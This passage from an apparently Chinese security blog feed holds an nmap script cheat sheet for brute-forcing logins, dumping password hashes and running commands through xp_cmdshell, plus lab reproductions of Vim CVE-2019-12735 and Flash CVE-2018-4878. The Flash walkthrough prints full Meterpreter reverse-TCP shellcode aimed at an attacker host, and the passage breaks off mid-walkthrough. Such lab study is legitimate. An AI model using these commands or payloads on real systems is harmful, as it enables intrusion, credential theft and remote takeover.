language-bash"><code class="language-bash">nmap --script<span class="token operator">=</span><span class="token operator">&lt;</span>脚本类型<span class="token operator">&gt;</span> <span class="token operator">&lt;</span>target IP<span class="token operator">&gt;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-bash"><code class="language-bash">auth: 负责处理鉴权证书（绕开鉴权）的脚本  broadcast: 在局域网内探查更多服务开启状况，如dhcp/dns/sqlserver等服务  brute: 提供暴力破解方式，针对常见的应用如http/snmp等  default: 使用-sC或-A选项扫描时候默认的脚本，提供基本脚本扫描能力  discovery: 对网络进行更多的信息，如SMB枚举、SNMP查询等  dos: 用于进行拒绝服务攻击  exploit: 利用已知的漏洞入侵系统  external: 利用第三方的数据库或资源，例如进行whois解析  fuzzer: 模糊测试的脚本，发送异常的包到目标机，探测出潜在漏洞 intrusive: 入侵性的脚本，此类脚本可能引发对方的IDS/IPS的记录或屏蔽  malware: 探测目标机是否感染了病毒、开启了后门等信息  safe: 此类与intrusive相反，属于安全性脚本  version: 负责增强服务与版本扫描（Version Detection）功能的脚本  vuln: 负责检查目标机是否有常见的漏洞（Vulnerability），如是否有MS08_067<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="使用通配符进行扫描"><a href="#使用通配符进行扫描" class="headerlink" title="使用通配符进行扫描"></a>使用通配符进行扫描</h2><pre class="line-numbers language-bash"><code class="language-bash"><span class="token comment" spellcheck="true"># 使用 http 系列的脚本进行扫描</span>nmap --script <span class="token string">"http-*"</span> <span class="token operator">&lt;</span>target<span class="token operator">&gt;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><pre class="line-numbers language-bash"><code class="language-bash"><span class="token comment" spellcheck="true"># 使用 smb 系列的脚本进行扫描</span>nmap --script<span class="token operator">=</span><span class="token string">"smb*"</span> <span class="token operator">&lt;</span>target<span class="token operator">&gt;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h2 id="详细的脚本扫描"><a href="#详细的脚本扫描" class="headerlink" title="详细的脚本扫描"></a>详细的脚本扫描</h2><hr><h3 id="永恒之蓝漏洞扫描"><a href="#永恒之蓝漏洞扫描" class="headerlink" title="永恒之蓝漏洞扫描"></a>永恒之蓝漏洞扫描</h3><p>普通扫描：</p><pre class="line-numbers language-bash"><code class="language-bash">nmap -p445 --script smb-vuln-ms17-010 <span class="token operator">&lt;</span>target<span class="token operator">&gt;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>禁 ping 扫描：</p><pre class="line-numbers language-bash"><code class="language-bash">nmap -p445 -Pn --script smb-vuln-ms17-010 <span class="token operator">&lt;</span>target<span class="token operator">&gt;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>指定多 IP 扫描：</p><pre class="line-numbers language-bash"><code class="language-bash">nmap -p445 --script smb-vuln-ms17-010 192.168.1.100 192.168.1.101 192.168.1.102<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>指定网段扫描：</p><pre class="line-numbers language-bash"><code class="language-bash">nmap -p445 --script smb-vuln-ms17-010 192.168.1.0/24 或者 nmap -p445 --script smb-vuln-ms17-010 192.168.1.0-254<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>STATE OPEN 表示445端口是开着的；STATE filtered表示主机未上线或者有防火墙。<br>Risk factor: HIGH 表示可被攻击，也就是未打补丁</p><h3 id="ftp"><a href="#ftp" class="headerlink" title="ftp"></a>ftp</h3><ol><li>检查目标 ftp 是否允许匿名登录,光能登陆还不够,它还会自动检测目录是否可读写,如,批量 ftp 抓鸡</li></ol><pre class="line-numbers language-bash"><code class="language-bash">nmap -p 21 --script ftp-anon.nse -v <span class="token operator">&lt;</span>target ip<span class="token operator">&gt;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol start="2"><li>ftp爆破脚本 [只会尝试一些比较简单的弱口令]</li></ol><pre class="line-numbers language-bash"><code class="language-bash">nmap -p 21 --script ftp-brute.nse -v <span class="token operator">&lt;</span>target ip<span class="token operator">&gt;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol start="3"><li>ProFTPD 1.3.3c之前的netio.c文件中的pr_netio_telnet_gets函数中存在多个栈溢出</li></ol><pre class="line-numbers language-bash"><code class="language-bash">nmap -p 21 --script ftp-vuln-cve2010-4221.nse -v <span class="token operator">&lt;</span>target ip<span class="token operator">&gt;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol start="4"><li>ProFTPD 1.3.3c 被人插后门</li></ol><pre class="line-numbers language-bash"><code class="language-bash">nmap -p 21 --script ftp-vuln-cve2010-4221.nse -v <span class="token operator">&lt;</span>target ip<span class="token operator">&gt;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol start="5"><li>VSFTPD v2.3.4 跟Proftp同样的问题,被人插了后门</li></ol><pre class="line-numbers language-bash"><code class="language-bash">nmap -p 21 --script ftp-vsftpd-backdoor.nse -v <span class="token operator">&lt;</span>target ip<span class="token operator">&gt;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol start="6"><li>使用自定义爆破字典进行爆破</li></ol><pre><code>nmap -p21 -sT –script ftp-brute.nse –script-args userdb=./user.txt,passdb=./pass.txt &lt;target ip&gt;</code></pre><h3 id="telnet"><a href="#telnet" class="headerlink" title="telnet"></a>telnet</h3><p>telnet 爆破</p><pre class="line-numbers language-bash"><code class="language-bash">nmap -p23 –script telnet-brute.nse –script-args userdb<span class="token operator">=</span>./user.txt,passdb<span class="token operator">=</span>./pass.txt <span class="token operator">&lt;</span>target ip<span class="token operator">&gt;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="和各种数据库相关的一些扫描脚本"><a href="#和各种数据库相关的一些扫描脚本" class="headerlink" title="和各种数据库相关的一些扫描脚本"></a>和各种数据库相关的一些扫描脚本</h3><ol><li>informix 爆破</li></ol><pre class="line-numbers language-bash"><code class="language-bash">nmap -p 9088 --script informix-brute.nse <span class="token operator">&lt;</span>target ip<span class="token operator">&gt;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol start="2"><li>mysql 扫描 root 空密码</li></ol><pre class="line-numbers language-bash"><code class="language-bash">nmap -p 3306 --script mysql-empty-password.nse -v <span class="token operator">&lt;</span>target ip<span class="token operator">&gt;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol start="3"><li>mysql root弱口令简单爆破</li></ol><pre class="line-numbers language-bash"><code class="language-bash">nmap -p 3306 --script mysql-brute.nse -v <span class="token operator">&lt;</span>target ip<span class="token operator">&gt;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol start="4"><li>导出mysql中所有用户的hash</li></ol><pre class="line-numbers language-bash"><code class="language-bash">nmap -p 3306 --script mysql-dump-hashes --script-args<span class="token operator">=</span><span class="token string">'username=root,password=root'</span> <span class="token operator">&lt;</span>target ip<span class="token operator">&gt;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol start="5"><li>Mysql 身份认证漏洞[MariaDB and MySQL  5.1.61,5.2.11, 5.3.5, 5.5.22],利用条件有些苛刻 [需要目标的 mysql 是自己源码编译安装的,这样的成功率相对较高]</li></ol><pre class="line-numbers language-bash"><code class="language-bash">nmap -p 3306 --script mysql-vuln-cve2012-2122.nse  -v <span class="token operator">&lt;</span>target ip<span class="token operator">&gt;</span>nmap -p 445 --script ms-sql-info.nse -v <span class="token operator">&lt;</span>network/netmask<span class="token operator">&gt;</span>      ms-sql-info.nse 扫描C段mssqlnmap -p 1433 --script ms-sql-info.nse --script-args mssql.instance-port<span class="token operator">=</span>1433 -v <span class="token operator">&lt;</span>network/netmask<span class="token operator">&gt;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ol start="6"><li>扫描 mssql sa 空密码</li></ol><pre class="line-numbers language-bash"><code class="language-bash">nmap -p 1433 --script ms-sql-empty-password.nse -v <span class="token operator">&lt;</span>network/netmask<span class="token operator">&gt;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol start="7"><li>sa弱口令爆破</li></ol><pre class="line-numbers language-bash"><code class="language-bash">nmap -p 1433 --script ms-sql-brute.nse -v <span class="token operator">&lt;</span>network/netmask<span class="token operator">&gt;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol start="8"><li>利用 xp_cmdshell 远程执行系统命令</li></ol><pre><code>nmap -p 1433 --script ms-sql-xp-cmdshell --script-args mssql.username=sa,mssql.password=sa,ms-sql-xp-cmdshell.cmd=net user test test add &lt;network/netmask&gt;</code></pre><ol start="9"><li>导出 mssql 中所有的数据库用户及密码 hash</li></ol><pre class="line-numbers language-bash"><code class="language-bash">nmap -p 1433 --script ms-sql-dump-hashes -v <span class="token operator">&lt;</span>network/netmask<span class="token operator">&gt;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol start="10"><li>尝试爆破 postgresql</li></ol><pre><code>nmap -p 5432 --script pgsql-brute -v &lt;network/netmask&gt;</code></pre><ol start="11"><li>尝试爆破 oracle</li></ol><pre class="line-numbers language-bash"><code class="language-bash">nmap --script oracle-brute-stealth -p 1521 --script-args oracle-brute-stealth.sid<span class="token operator">=</span>ORCL  -v <span class="token operator">&lt;</span>network/netmask<span class="token operator">&gt;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol start="12"><li>oracle-brute.nse</li></ol><pre><code>nmap --script oracle-brute -p 1521 --script-args oracle-brute.sid=ORCL -v &lt;network/netmask&gt;</code></pre><ol start="13"><li>尝试爆破 mongdb</li></ol><pre><code># nmap -p 27017  --script mongodb-brute &lt;network/netmask&gt;</code></pre><ol start="14"><li>redis爆破</li></ol><pre><code>nmap -p 6379 --script redis-brute.nse &lt;network/netmask&gt;</code></pre><ol start="15"><li>指定字典爆破 mysql</li></ol><pre class="line-numbers language-bash"><code class="language-bash">nmap -p3306 –script mysql-brute.nse –script-args userdb<span class="token operator">=</span>./user.txt,passdb<span class="token operator">=</span>./pass.txt <span class="token operator">&lt;</span>target ip<span class="token operator">&gt;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="smb"><a href="#smb" class="headerlink" title="smb"></a>smb</h3><ol><li>爆破 smb</li></ol><pre class="line-numbers language-bash"><code class="language-bash">nmap -p445 –script smb-brute.nse –script-args userdb<span class="token operator">=</span>./user.txt,passdb<span class="token operator">=</span>./pass.txt <span class="token operator">&lt;</span>target ip<span class="token operator">&gt;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol start="2"><li>smb 漏洞扫描</li></ol><pre class="line-numbers language-bash"><code class="language-bash">nmap -p445 --script smb-vuln-ms17-010.nse <span class="token operator">&lt;</span>target ip<span class="token operator">&gt;</span>nmap -p445 --script smb-vuln-ms08-067.nse <span class="token operator">&lt;</span>target ip<span class="token operator">&gt;</span>nmap -p445 --script smb-vuln-ms10-054.nse <span class="token operator">&lt;</span>target ip<span class="token operator">&gt;</span>nmap -p445 --script smb-vuln-ms10-061.nse <span class="token operator">&lt;</span>target ip<span class="token operator">&gt;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h3 id="僵尸主机扫描"><a href="#僵尸主机扫描" class="headerlink" title="僵尸主机扫描"></a>僵尸主机扫描</h3><pre class="line-numbers language-bash"><code class="language-bash">nmap -p445 192.168.86.132 --script<span class="token operator">=</span>ipidseq.nse<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="web漏洞扫描"><a href="#web漏洞扫描" class="headerlink" title="web漏洞扫描"></a>web漏洞扫描</h3><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">cd</span> /usr/share/nmap/scripts/  <span class="token function">wget</span> http://www.computec.ch/projekte/vulscan/download/nmap_nse_vulscan-2.0.tar.gz <span class="token operator">&amp;&amp;</span> <span class="token function">tar</span> xzf nmap_nse_vulscan-2.0.tar.gz  nmap -sS -sV --script<span class="token operator">=</span>vulscan/vulscan.nse target  nmap -sS -sV --script<span class="token operator">=</span>vulscan/vulscan.nse –script-args vulscandb<span class="token operator">=</span>scipvuldb.csv target  nmap -sS -sV --script<span class="token operator">=</span>vulscan/vulscan.nse –script-args vulscandb<span class="token operator">=</span>scipvuldb.csv -p80 target  nmap -PN -sS -sV --script<span class="token operator">=</span>vulscan –script-args vulscancorrelation<span class="token operator">=</span>1 -p80 target  nmap -sV --script<span class="token operator">=</span>vuln target  nmap -PN -sS -sV --script<span class="token operator">=</span>all –script-args vulscancorrelation<span class="token operator">=</span>1 target  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="更新-vulscan-nse-数据库"><a href="#更新-vulscan-nse-数据库" class="headerlink" title="更新 vulscan.nse 数据库"></a>更新 vulscan.nse 数据库</h4><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">git</span> clone https://github.com/petrocchi/NV-updatedb.git<span class="token function">chmod</span> +x NV-updatedb.sh./NV-updatedb.sh<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h3 id="工控扫描"><a href="#工控扫描" class="headerlink" title="工控扫描"></a>工控扫描</h3><ol><li>探测modbus协议的设备</li></ol><pre class="line-numbers language-bash"><code class="language-bash">nmap -sV –script modbus-discover <span class="token operator">&lt;</span>target ip<span class="token operator">&gt;</span> -p 502<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol start="2"><li>探测EthernetIP协议的设备</li></ol><pre class="line-numbers language-bash"><code class="language-bash">nmap -p 44818 –script enip-enumerate.nse <span class="token operator">&lt;</span>target ip<span class="token operator">&gt;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol start="3"><li>探测 CoDeSyS 协议的设备</li></ol><pre class="line-numbers language-bash"><code class="language-bash">nmap -p 1200,2455 –script codesys-v2-discover <span class="token operator">&lt;</span>target ip<span class="token operator">&gt;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol start="4"><li>探测 NiagaraFox 协议的设备</li></ol><pre class="line-numbers language-bash"><code class="language-bash">nmap -p 1911 –script fox-info <span class="token operator">&lt;</span>target ip<span class="token operator">&gt;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol start="5"><li>探测S7协议的设备</li></ol><pre class="line-numbers language-bash"><code class="language-bash">nmap -p 102 –script s7-enumerate.nse <span class="token operator">&lt;</span>target ip<span class="token operator">&gt;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol start="6"><li>检查宿主是否感染了 stuxnet 蠕虫漏洞</li></ol><pre><code>nmap --script stuxnet-detect.nse &lt;target ip&gt;</code></pre><h2 id="reference"><a href="#reference" class="headerlink" title="reference"></a>reference</h2><hr><p><a href="https://blog.csdn.net/whatday/article/details/73823959" target="_blank" rel="noopener">nmap脚本（nse）使用总结</a></p><p><a href="https://blog.csdn.net/zoushurong1/article/details/71153761" target="_blank" rel="noopener">nmap常用命令集合</a></p><p><a href="https://klionsec.github.io/2017/05/18/nmap-script/" target="_blank" rel="noopener">nmap 进阶使用 [ 脚本篇 ]</a></p><p><a href="https://github.com/No-Github/1earn/blob/master/1earn/%E5%AE%89%E5%85%A8/%E5%B7%A5%E5%85%B7/nmap%E7%AC%94%E8%AE%B0.md?1578542444215">nmap笔记</a></p><p><a href="https://www.key1.top/index.php/archives/433/" target="_blank" rel="noopener">工控安全：Nmap NSE扫描脚本列表</a></p><p><a href="https://www.freebuf.com/articles/ics-articles/209786.html" target="_blank" rel="noopener">工控资产嗅探与分析实践</a></p><p><a href="https://www.jianshu.com/p/4dd4398a08ba" target="_blank" rel="noopener">僵尸扫描</a></p><p><a href="https://blog.csdn.net/qq_29277155/article/details/51175015" target="_blank" rel="noopener">使用nmap绕过防火墙进行扫描</a></p><p><a href="https://linuxhint.com/nmap_idle_scan_tutorial/" target="_blank" rel="noopener">Nmap Idle Scan tutorial</a></p><p><a href="http://www.secist.com/archives/1310.html" target="_blank" rel="noopener">关于Nmap的简单爆破</a></p><p><a href="http://rinige.com/index.php/archives/498/" target="_blank" rel="noopener">最好的 NMAP 扫描策略</a></p><p><a href="https://github.com/scipag/vulscan">vulscan</a></p><p><a href="https://www.freebuf.com/column/149716.html" target="_blank" rel="noopener">Nmap 进阶使用 [ 脚本篇 ]</a></p><p><a href="https://github.com/petrocchi/NV-updatedb.git">NV-updatedb</a></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> tools </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 信息收集 </tag>
            
            <tag> 漏洞扫描 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CVE-2019-12735复现</title>
      <link href="/2020/01/09/CVE-2019-12735%E5%A4%8D%E7%8E%B0/"/>
      <url>/2020/01/09/CVE-2019-12735%E5%A4%8D%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><hr><p>Vim 是从 vi 发展出来的一个文本编辑器。代码补全、编译及错误跳转等方便编程的功能特别丰富，在程序员中被广泛使用，和 Emacs 并列成为类 Unix 系统用戶最喜欢的文本编辑器。Neovim 是一个基于 vim 源代码的重构项目。</p><p>2019 年 06 月 04 日，Vim &amp; neovim 被曝出任意代码执行漏洞。攻击者通过诱使受害者使用 vim 或者 neovim 打开一个精心制作的文件，可以在目标机器上执行任意命令。</p><p>该漏洞是由于启用了 modeline 模式导致的，Vim &amp; neovim 历史上也多次曝出和 modeline 相关的漏洞。</p><h2 id="受影响版本"><a href="#受影响版本" class="headerlink" title="受影响版本"></a>受影响版本</h2><hr><pre class="line-numbers language-bash"><code class="language-bash">Vim <span class="token operator">&lt;</span> 8.1.1365,Neovim <span class="token operator">&lt;</span> 0.3.6<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><hr><h3 id="受害靶机"><a href="#受害靶机" class="headerlink" title="受害靶机"></a>受害靶机</h3><p>kali 2019.4</p><p>注：在 centos 中测试并没有成功（vim是7.4），具体原因不明。</p><h3 id="vim-版本"><a href="#vim-版本" class="headerlink" title="vim 版本"></a>vim 版本</h3><p>8.1.875</p><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><hr><ol><li><strong>克隆POC</strong></li></ol><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">git</span> clone https://github.com/pcy190/ace-vim-neovim.git<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol start="2"><li><strong>开启 modeline</strong></li></ol><pre class="line-numbers language-bash"><code class="language-bash">vim ~/.vimrc<span class="token comment" spellcheck="true">#添加以下设置,作用是启用Modeline,即允许被编辑的文件以注释的形式设置Vim选项</span><span class="token keyword">set</span> modeline<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><ol start="3"><li><strong>执行 POC</strong></li></ol><pre class="line-numbers language-bash"><code class="language-bash">root@kali:~/ace-vim-neovim<span class="token comment" spellcheck="true"># vim poc_uname.txt</span>Linux kali 4.19.0-kali1-amd64 <span class="token comment" spellcheck="true">#1 SMP Debian 4.19.13-1kali1 (2019-01-03) x86_64 GNU/Linux</span>请按 ENTER 或其它命令继续<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="reference"><a href="#reference" class="headerlink" title="reference"></a>reference</h2><hr><p><a href="https://shavchen.github.io/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%EF%BC%9ACVE-2019-12735-vim%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/#%E5%88%A9%E7%94%A8%E7%AF%87" target="_blank" rel="noopener">漏洞复现：CVE_2019_12735 Vim任意代码执行</a></p><p><a href="https://www.freebuf.com/vuls/205516.html" target="_blank" rel="noopener">基于VIM漏洞CVE-2019-12735的VIM宏后门病毒详解</a></p><p><a href="https://github.com/pcy190/ace-vim-neovim/">pcy190/ace-vim-neovim</a></p><p><a href="https://paper.seebug.org/952/" target="_blank" rel="noopener">Vim/Neovim 基于 modeline 的多个任意代码执行漏洞分析（CVE-2002-1377、CVE-2016-1248、CVE-2019-12735）</a></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> system security </category>
          
      </categories>
      
      
        <tags>
            
            <tag> linux </tag>
            
            <tag> vim </tag>
            
            <tag> Neovim </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CVE-2018-4878复现</title>
      <link href="/2020/01/06/CVE-2018-4878%E5%A4%8D%E7%8E%B0/"/>
      <url>/2020/01/06/CVE-2018-4878%E5%A4%8D%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<h2 id="漏洞概述"><a href="#漏洞概述" class="headerlink" title="漏洞概述"></a>漏洞概述</h2><hr><p>2018 年 2 月 1 号，Adobe 官方发布安全通报（APSA18-01），声明 Adobe Flash 28.0.0.137 及其之前的版本，存在高危漏洞（CVE-2018-4878）。</p><p>攻击者通过构造特殊的 Flash 链接，当用户用浏览器/邮件/Office访问此 Flash 链接时，会被“远程代码执行”，并且直接被 getshell。</p><p>直到 2018 年 2 月 5 号，Adboe 才发布补丁来修复此 0 day 漏洞。</p><h2 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h2><hr><h3 id="攻击者"><a href="#攻击者" class="headerlink" title="攻击者"></a>攻击者</h3><p><strong>操作系统：</strong> kali</p><p><strong>Metasploit：</strong> v5.0.62-dev</p><p><strong>IP：</strong> 192.168.150.142</p><p><strong>EXP：</strong><a href="https://github.com/anbai-inc/CVE-2018-4878.git">https://github.com/anbai-inc/CVE-2018-4878.git</a></p><h3 id="受害者（靶机）"><a href="#受害者（靶机）" class="headerlink" title="受害者（靶机）"></a>受害者（靶机）</h3><p><strong>操作系统：</strong> windows 7 sp1 x86</p><p><strong>Flash Player 版本：</strong> flashplayer27_0r0_187_win</p><p><strong>IP：</strong> 192.168.150.132</p><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><h3 id="在靶机上下载并安装-flash-player"><a href="#在靶机上下载并安装-flash-player" class="headerlink" title="在靶机上下载并安装 flash player"></a>在靶机上下载并安装 flash player</h3><p><a href="https://helpx.adobe.com/tw/flash-player/kb/archived-flash-player-versions.html" target="_blank" rel="noopener">https://helpx.adobe.com/tw/flash-player/kb/archived-flash-player-versions.html</a></p><h3 id="克隆配置-EXP-文件"><a href="#克隆配置-EXP-文件" class="headerlink" title="克隆配置 EXP 文件"></a>克隆配置 EXP 文件</h3><pre class="line-numbers language-bash"><code class="language-bash">root@kali:~/CVE <span class="token comment" spellcheck="true"># git clone https://github.com/anbai-inc/CVE-2018-4878.git &amp;&amp; cd Office8570</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="生成-shellcode-并复制"><a href="#生成-shellcode-并复制" class="headerlink" title="生成 shellcode,并复制"></a>生成 shellcode,并复制</h3><pre class="line-numbers language-bash"><code class="language-bash">root@kali:~/CVE/CVE-2018-4878 <span class="token comment" spellcheck="true"># msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.150.142 LPORT=6666 -f py</span><span class="token punctuation">[</span>-<span class="token punctuation">]</span> No platform was selected, choosing Msf::Module::Platform::Windows from the payload<span class="token punctuation">[</span>-<span class="token punctuation">]</span> No arch selected, selecting arch: x86 from the payloadNo encoder or badchars specified, outputting raw payloadPayload size: 341 bytesFinal size of py file: 1672 bytesbuf <span class="token operator">=</span>  b<span class="token string">""</span>buf +<span class="token operator">=</span> b<span class="token string">"\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64\x8b"</span>buf +<span class="token operator">=</span> b<span class="token string">"\x50\x30\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7"</span>buf +<span class="token operator">=</span> b<span class="token string">"\x4a\x26\x31\xff\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf"</span>buf +<span class="token operator">=</span> b<span class="token string">"\x0d\x01\xc7\xe2\xf2\x52\x57\x8b\x52\x10\x8b\x4a\x3c"</span>buf +<span class="token operator">=</span> b<span class="token string">"\x8b\x4c\x11\x78\xe3\x48\x01\xd1\x51\x8b\x59\x20\x01"</span>buf +<span class="token operator">=</span> b<span class="token string">"\xd3\x8b\x49\x18\xe3\x3a\x49\x8b\x34\x8b\x01\xd6\x31"</span>buf +<span class="token operator">=</span> b<span class="token string">"\xff\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75\xf6\x03\x7d"</span>buf +<span class="token operator">=</span> b<span class="token string">"\xf8\x3b\x7d\x24\x75\xe4\x58\x8b\x58\x24\x01\xd3\x66"</span>buf +<span class="token operator">=</span> b<span class="token string">"\x8b\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0"</span>buf +<span class="token operator">=</span> b<span class="token string">"\x89\x44\x24\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x5f"</span>buf +<span class="token operator">=</span> b<span class="token string">"\x5f\x5a\x8b\x12\xeb\x8d\x5d\x68\x33\x32\x00\x00\x68"</span>buf +<span class="token operator">=</span> b<span class="token string">"\x77\x73\x32\x5f\x54\x68\x4c\x77\x26\x07\x89\xe8\xff"</span>buf +<span class="token operator">=</span> b<span class="token string">"\xd0\xb8\x90\x01\x00\x00\x29\xc4\x54\x50\x68\x29\x80"</span>buf +<span class="token operator">=</span> b<span class="token string">"\x6b\x00\xff\xd5\x6a\x0a\x68\xc0\xa8\x96\x8e\x68\x02"</span>buf +<span class="token operator">=</span> b<span class="token string">"\x00\x1a\x0a\x89\xe6\x50\x50\x50\x50\x40\x50\x40\x50"</span>buf +<span class="token operator">=</span> b<span class="token string">"\x68\xea\x0f\xdf\xe0\xff\xd5\x97\x6a\x10\x56\x57\x68"</span>buf +<span class="token operator">=</span> b<span class="token string">"\x99\xa5\x74\x61\xff\xd5\x85\xc0\x74\x0a\xff\x4e\x08"</span>buf +<span class="token operator">=</span> b<span class="token string">"\x75\xec\xe8\x67\x00\x00\x00\x6a\x00\x6a\x04\x56\x57"</span>buf +<span class="token operator">=</span> b<span class="token string">"\x68\x02\xd9\xc8\x5f\xff\xd5\x83\xf8\x00\x7e\x36\x8b"</span>buf +<span class="token operator">=</span> b<span class="token string">"\x36\x6a\x40\x68\x00\x10\x00\x00\x56\x6a\x00\x68\x58"</span>buf +<span class="token operator">=</span> b<span class="token string">"\xa4\x53\xe5\xff\xd5\x93\x53\x6a\x00\x56\x53\x57\x68"</span>buf +<span class="token operator">=</span> b<span class="token string">"\x02\xd9\xc8\x5f\xff\xd5\x83\xf8\x00\x7d\x28\x58\x68"</span>buf +<span class="token operator">=</span> b<span class="token string">"\x00\x40\x00\x00\x6a\x00\x50\x68\x0b\x2f\x0f\x30\xff"</span>buf +<span class="token operator">=</span> b<span class="token string">"\xd5\x57\x68\x75\x6e\x4d\x61\xff\xd5\x5e\x5e\xff\x0c"</span>buf +<span class="token operator">=</span> b<span class="token string">"\x24\x0f\x85\x70\xff\xff\xff\xe9\x9b\xff\xff\xff\x01"</span>buf +<span class="token operator">=</span> b<span class="token string">"\xc3\x29\xc6\x75\xc1\xc3\xbb\xf0\xb5\xa2\x56\x6a\x00"</span>buf +<span class="token operator">=</span> b<span class="token string">"\x53\xff\xd5"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="修改-cve-2018-4878-py"><a href="#修改-cve-2018-4878-py" class="headerlink" title="修改 cve-2018-4878.py"></a>修改 cve-2018-4878.py</h3><p>将原来的 shellcode 替换为刚才生成的代码；把 stageless 改为 “ False “；修改文件生成路径</p><p><img src="https://i.loli.net/2020/01/06/9vPRD4BbGFLZ1Qu.png" alt="2018-4878-1.png"></p><p><img src="https://i.loli.net/2020/01/06/TjHo6wQYUlkNiXJ.png" alt="2018-4878-2.png"></p><h3 id="执行脚本文件，开启-apache-服务，并将生成的-“index2-html”-和-“exploit-swf”-复制到-var-www-html"><a href="#执行脚本文件，开启-apache-服务，并将生成的-“index2-html”-和-“exploit-swf”-复制到-var-www-html" class="headerlink" title="执行脚本文件，开启 apache 服务，并将生成的 “index2.html” 和 “exploit.swf” 复制到 /var/www/html"></a>执行脚本文件，开启 apache 服务，并将生成的 “index2.html” 和 “exploit.swf” 复制到 